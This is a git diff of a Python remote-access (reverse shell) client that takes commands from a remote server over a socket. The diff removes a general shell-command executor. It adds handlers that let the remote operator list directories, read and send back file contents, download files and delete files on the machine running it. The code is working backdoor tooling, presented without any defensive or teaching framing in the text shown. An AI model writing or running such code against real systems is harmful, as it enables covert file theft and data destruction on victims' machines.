@@ -1,33 +1,8 @@
 import socket as st
-from subprocess import Popen, PIPE
+# from subprocess import Popen, PIPE
 import os
 from colorama import Fore, Style
 
-def execute_command(cmd):
-    try:
-        if cmd.startswith('cd '):  
-            _dir = cmd.split(maxsplit=1)[1]  
-            os.chdir(_dir)  
-            return b"Directory changed successfully\n"
-        
-        if cmd.startswith('download '):
-            dfile = cmd.split()[1]
-            if os.path.isfile(dfile):
-                with open(dfile,'r',encoding='utf-8') as file:
-                    return file
-            else:
-                return b'file doesnt exist\n'
-
-        if cmd in ('pwd', 'cwd'):
-            return os.getcwd().encode() + b"\n"
-
-        proc = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
-        getout, geterr = proc.communicate()
-
-        return getout if getout else geterr or b"\n"  
-
-    except Exception as err:
-        return f"Error: {err}".encode()  
 
 def main():
     sock = st.socket(st.AF_INET, st.SOCK_STREAM)
@@ -39,8 +14,49 @@ def main():
             print("Connection closed by server.")
             break 
 
-        result = execute_command(get_cmd)
-        sock.sendall(result) 
+        try:
+            if get_cmd.startswith('cd '):  
+                _dir = get_cmd.split(maxsplit=1)[1]  
+                os.chdir(_dir)  
+                sock.send(b"Directory changed successfully\n")
+
+            elif get_cmd.startswith('rm '):
+                file_name = get_cmd.split()[1]
+                if os.path.exists(file_name):
+                    os.remove(file_name)
+                    sock.send('The file \'{}\' removed successfully'.format(file_name).encode())
+                else:
+                    sock.send('The file \'{}\' doesnt exist'.format(file_name).encode())
+
+            elif get_cmd == 'ls':
+                _dir = os.getcwd()
+                files = '\n'.join(os.listdir(_dir))
+                sock.sendall(files.encode() + b'\n')
+            
+            elif get_cmd.startswith('cat '):  # Read and send file contents
+                file_path = get_cmd.split(maxsplit=1)[1]
+                if os.path.exists(file_path) and os.path.isfile(file_path):
+                    with open(file_path, "r") as f:
+                        sock.sendall(f.read().encode())
+                else:
+                    sock.send(b"Error: File not found\n")
+
+            elif get_cmd.startswith('download '):  # Send file for download
+                dfile = get_cmd.split(maxsplit=1)[1]
+                if os.path.isfile(dfile):
+                    with open(dfile, 'rb') as file:
+                        sock.sendall(file.read())
+                else:
+                    sock.send(b'Error: File does not exist\n')
+
+            elif get_cmd in ('pwd', 'cwd'):  
+                sock.send(os.getcwd().encode() + b"\n")
+
+            else:
+                sock.send('Invalid command found : {}'.format(get_cmd).encode())
+
+        except Exception as err:
+            return f"Error: {err}".encode()  
 
     sock.close() 
 
